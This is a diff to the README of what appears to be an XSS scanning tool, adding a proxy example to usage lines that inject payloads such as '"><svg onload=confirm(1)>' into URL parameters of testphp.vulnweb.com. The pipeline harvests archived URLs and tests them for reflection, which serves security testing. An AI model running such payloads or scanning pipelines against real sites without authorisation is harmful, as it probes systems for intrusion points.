@@ -60,6 +60,13 @@ OR
     `echo "http://testphp.vulnweb.com:80/hpp/index.php?pp=x" | qsreplace '"><img src=x onerror=prompt(1)>' | airixss -payload '<img src=x onerror=prompt(1)>'`
     <br>
     `echo "http://testphp.vulnweb.com:80/hpp/index.php?pp=x" | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"`
+    <br>
+    
+    You can use with proxy:
+    
+    `echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" --proxy "http://yourproxy"`
+    
+    
 
 <br>
 
